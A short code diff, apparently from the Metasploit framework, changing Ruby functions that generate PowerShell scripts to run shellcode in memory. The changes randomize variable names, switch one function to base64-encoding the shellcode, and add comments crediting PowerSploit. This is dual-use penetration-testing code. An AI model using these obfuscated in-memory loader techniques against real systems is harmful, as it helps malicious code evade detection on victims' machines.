@@ -914,15 +914,17 @@ require 'msf/core/exe/segment_injector'
     hash_sub[:var_rwx] 		= Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_iter] 		= Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_syscode] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-
     hash_sub[:shellcode] = Rex::Text.to_powershell(code, hash_sub[:var_code])
 
     return read_replace_script_template("to_mem_old.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
   end
-  
+
+  #
+  # Reflection technique prevents the temporary .cs file being created for the .NET compiler
+  # Tweaked by shellster
+  # Originally from PowerSploit
+  #
   def self.to_win32pe_psh_reflection(framework, code, opts={})
-    #Added a tweaked by shellster
-    #Originally taken from https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1
     hash_sub = {}
     hash_sub[:func_get_proc_address] = Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:func_get_delegate_type] = Rex::Text.rand_text_alpha(rand(8)+8)
@@ -935,7 +937,8 @@ require 'msf/core/exe/segment_injector'
     hash_sub[:var_type_builder] = Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_buffer] = Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_memset] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:shellcode] = Rex::Text.to_powershell(code, hash_sub[:var_code])
+
+    hash_sub[:b64shellcode] = Rex::Text.encode_base64(code)
 
     return read_replace_script_template("to_mem_pshreflection.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
   end
